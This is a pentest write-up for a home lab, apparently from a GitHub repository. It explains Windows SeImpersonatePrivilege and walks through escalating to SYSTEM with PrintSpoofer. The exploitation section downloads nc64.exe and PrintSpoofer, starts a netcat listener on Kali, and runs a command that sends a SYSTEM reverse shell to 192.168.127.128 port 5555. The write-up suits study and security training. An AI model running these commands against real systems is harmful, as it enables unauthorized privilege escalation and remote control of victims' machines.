<h1 align="center"> SeImpersonatePrivilege </h1>


<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/220ea4af-d9b7-422c-a68d-874e69e64a7a" />




# Introduction to SeImpersonatePrivilege

## What is SeImpersonatePrivilege?
**SeImpersonatePrivilege** is a Windows user right called “Impersonate a client after authentication.” It allows a process to take on the security identity of another user or client that connects to it. This privilege is essential for many legitimate Windows services, but when misused, it can be exploited to escalate privileges from a low‑privileged account to `NT AUTHORITY\SYSTEM`.


### Basic Concept:
````
SeImpersonatePrivilege = "Act as part of the operating system"
                    OR "Impersonate a client after authentication"
````

### What Does It Allow?
A user with this privilege can impersonate any other user on the system, including SYSTEM (highest privilege).


### Where Is It Used?
- Windows Services running as LOCAL SERVICE or NETWORK SERVICE
- IIS application pools
- SQL Server service accounts
- COM/DCOM servers




## WHY IS SeImpersonatePrivilege DANGEROUS?

### The Problem:
If we have SeImpersonatePrivilege AND SeAssignPrimaryTokenPrivilege, we can:
- Create a new process
- Assign it a SYSTEM token
- Become SYSTEM user

### Services That Usually Have It:
- IIS AppPool identities
- SQL Server service accounts  
- COM/DCOM servers
- Some third-party services
- Windows services running as:
  - NT AUTHORITY\LOCAL SERVICE
  - NT AUTHORITY\NETWORK SERVICE


## Why It’s Important in Exploitation
- **Privilege escalation vector**: Many “Potato” exploits rely on SeImpersonatePrivilege.
- **Attack path**:
  - Attacker runs code under a service account with SeImpersonatePrivilege.
  - They coerce a privileged service (like Print Spooler or EFSRPC) to connect to them.
  - They impersonate the SYSTEM token from that connection.
  - They spawn a SYSTEM shell or process.




---


# Setup:

on Windows -> Open `Terminal`:
````
whoami /all
````
<img width="1168" height="646" alt="image" src="https://github.com/user-attachments/assets/22c11014-b6cd-42fe-8594-13c0ef1e4d35" />

- After open `Powershell Administrator` -> press `Ctrl + X` -> Click on `Windows Powershell (Admin)`:
<img width="276" height="587" alt="image" src="https://github.com/user-attachments/assets/845625f2-e81d-46ad-b7f4-7f46ccb22734" />

<img width="452" height="313" alt="image" src="https://github.com/user-attachments/assets/fb33d895-d47b-4572-b3a8-afca4393519d" />


````
whoami /all
````
<img width="1102" height="832" alt="image" src="https://github.com/user-attachments/assets/e65e91d5-2c83-4564-b686-8cca7a2f4a03" />

````
net user
````
<img width="586" height="134" alt="image" src="https://github.com/user-attachments/assets/65028440-6a3e-4453-a7aa-1bcd63929600" />


````
net user k4n0ng
````
<img width="410" height="411" alt="image" src="https://github.com/user-attachments/assets/907a21c8-f8dd-4087-b946-af22015439ac" />

- In this I see my local Group Memberships is `administrator`. IF we see nomal like `Users` we can edit setting -> press `Ctrl + S` -> search `edit group policy`:
<img width="787" height="673" alt="image" src="https://github.com/user-attachments/assets/1cac52ed-00be-49e5-b907-18fc94e600d9" />

<img width="962" height="877" alt="image" src="https://github.com/user-attachments/assets/061e36b6-aff7-4cf6-aa0a-4ee743c53177" />

<img width="417" height="505" alt="image" src="https://github.com/user-attachments/assets/2838581a-b6d4-41ae-8f9c-ed907ee64e11" />

<img width="452" height="251" alt="image" src="https://github.com/user-attachments/assets/deed31c9-4d7a-4e7f-b71b-0fca7ddb918d" />

- In this we can input our windows name, `k4n0ng` is my username windows: 
<img width="460" height="257" alt="image" src="https://github.com/user-attachments/assets/8d137d1b-c6de-43c9-8daf-7d6a12181574" />

<img width="460" height="242" alt="image" src="https://github.com/user-attachments/assets/ce59a9bd-2224-4d3d-a269-4e1e7342c778" />

<img width="416" height="503" alt="image" src="https://github.com/user-attachments/assets/cf1d653e-706e-4900-9795-1584a112ffbf" />

- After click `Restart` this PC:

- After we Restart this PC -> `Right-Click` on `Terminal` -> `Run as Administrator`: 
````
whoami /all
````
<img width="1299" height="457" alt="image" src="https://github.com/user-attachments/assets/e044e3fa-c59f-4c2e-891d-1241598f53b0" />

<img width="1002" height="493" alt="image" src="https://github.com/user-attachments/assets/a67a2429-4186-4d07-87f0-a0bf7c52fb46" />


- Or:
````
whoami /priv
````
<img width="959" height="517" alt="image" src="https://github.com/user-attachments/assets/d505ec1a-21e0-4f18-9c97-5dfb84758340" />

- Now we see our `Impersonate a client after authentication` is `enabled`.


---



# SeImpersonatePrivilege Methodology

## CHECKING FOR SeImpersonatePrivilege

### Check all privileges 
````
whoami /all
````
- or
````
whoami /priv
````
<img width="859" height="467" alt="image" src="https://github.com/user-attachments/assets/875de9f8-41f1-4de5-86b3-46668f9aff99" />


> Note: In this we run as administrator.



### Check specific
````
whoami /priv | findstr /i impersonate
````
<img width="844" height="68" alt="image" src="https://github.com/user-attachments/assets/34190673-81fa-4b73-b6c8-96fc6ab21497" />



---





# EXPLOITATION METHODS

- First download ncat for remote machine: 
````
iwr -uri "https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe" -Outfile nc64.exe
````
<img width="1323" height="117" alt="image" src="https://github.com/user-attachments/assets/af97bdcd-896d-4746-9978-3da7e2dec82d" />



## PrintSpoofer

### PrintSpoofer Exploit Download:
- First to check our type machine:
````
systeminfo
````
<img width="1040" height="630" alt="image" src="https://github.com/user-attachments/assets/ac48309d-1956-4570-bafb-346c91cfeca7" />

- Now my machine is `64 bit`.

- PrintSpoofer: https://github.com/itm4n/PrintSpoofer
````
iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" -Outfile PrintSpoofer64.exe
````
<img width="1607" height="120" alt="image" src="https://github.com/user-attachments/assets/5ea6f3ad-fade-45a3-9286-87e02d323c02" />

- Now we was successful to download `PrintSpoofer`.


### On kali Linux
````
nc -lvnp 5555
````
<img width="433" height="113" alt="image" src="https://github.com/user-attachments/assets/b870b29f-20e9-468a-86de-a3254508c534" />



### On Windows
- Check PrintSpoofer
````
ls PrintSpoofer64.exe
````
<img width="823" height="248" alt="image" src="https://github.com/user-attachments/assets/b760b686-ccf4-47ed-834d-6a9552bd9cbe" />

- Now we see or `PrintSpoofer` that we was download.



### After on Kali
Check IP
````
ifconfig
````
<img width="1246" height="626" alt="image" src="https://github.com/user-attachments/assets/b347e8d6-d81d-4c82-adbc-66cc39e4b9a8" />

- After back to our Windows target:
````
.\PrintSpoofer64.exe -i -c "cmd.exe /c nc.exe 192.168.127.128 5555 -e cmd.exe"
````
<img width="1205" height="188" alt="image" src="https://github.com/user-attachments/assets/9071a2f4-2c7b-447c-8fa9-27c50e9e2922" />

- But in this I error, cause my `nc.exe` is not recognized.

- After I want to check my `nc.exe` file:
````
ls nc.exe
````
<img width="1418" height="233" alt="image" src="https://github.com/user-attachments/assets/4d1fccf9-67c7-40ab-a1b5-1bf99b006909" />

- So in this I don't have `nc.exe` file. After I need to download.


- Create the folder:
````
mkdir C:\Tools
````
<img width="888" height="268" alt="image" src="https://github.com/user-attachments/assets/0a3c7d68-7b50-48ca-8546-e944d0103aff" />

- After download:
````
iwr -uri "https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe" -Outfile C:\Tools\nc.exe
````
<img width="1394" height="110" alt="image" src="https://github.com/user-attachments/assets/a33da834-86a2-409a-9d6e-7e899128ae45" />


- Check
````
ls C:\Tools\nc.exe
````
<img width="665" height="261" alt="image" src="https://github.com/user-attachments/assets/a272d946-60b4-4264-815f-401829f556cb" />


- After execute our file again:
````
.\PrintSpoofer64.exe -i -c "cmd.exe /c C:\Tools\nc.exe 192.168.127.128 5555 -e cmd.exe"
````
<img width="1263" height="162" alt="image" src="https://github.com/user-attachments/assets/82d591af-c32c-4bbe-8534-94763bb96ff2" />

- Now we got successful to execute it. After back to our attacker machine.


### On Attacker (kali):
<img width="766" height="812" alt="image" src="https://github.com/user-attachments/assets/5fee3280-8b04-4357-b64e-d0d328b9b05d" />

- Now we got successful to get target shell.


---

<h2 align="center"> SeImpersonatePrivilege </h2>


---

<h2 align="center"> 
  &copy; 2026 Nin Kanong (<a href="https://github.com/Nin-Kanong/pentest-writeups">@k4n0ng</a>). All rights reserved.
</h2>

